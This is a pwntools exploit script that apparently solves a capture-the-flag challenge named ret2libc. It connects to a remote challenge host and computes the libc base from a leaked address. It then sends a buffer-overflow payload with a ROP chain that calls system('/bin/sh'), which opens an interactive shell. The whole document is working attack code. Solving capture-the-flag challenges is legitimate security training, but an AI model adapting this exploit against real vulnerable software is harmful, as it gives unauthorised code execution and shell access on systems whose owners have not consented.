from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

#p = process('./chall')
p = remote("ret2libc-pwn.wanictf.org",9007)
elf = ELF('./chall')
libc = ELF('./libc.so.6')

p.recvuntil(b'+0x28 | ')
leak = int(p.recvn(18),16)

print(hex(leak))

libc.base = leak - 0x29d90

print(hex(libc.base))

payload = b'a'*40
payload += p64(next(libc.search(asm("pop rdi; ret"))))
payload += p64(next(libc.search(b'/bin/sh\0')))
#payload += p64(next(libc.search(asm("pop rsi; ret"))))
#payload += p64(0x0)
payload += p64(next(libc.search(asm("ret"))))
payload += p64(libc.sym["system"])
payload += b'a'*(128 - len(payload))

p.recvuntil(b'> ')

p.sendline(payload)
p.interactive()
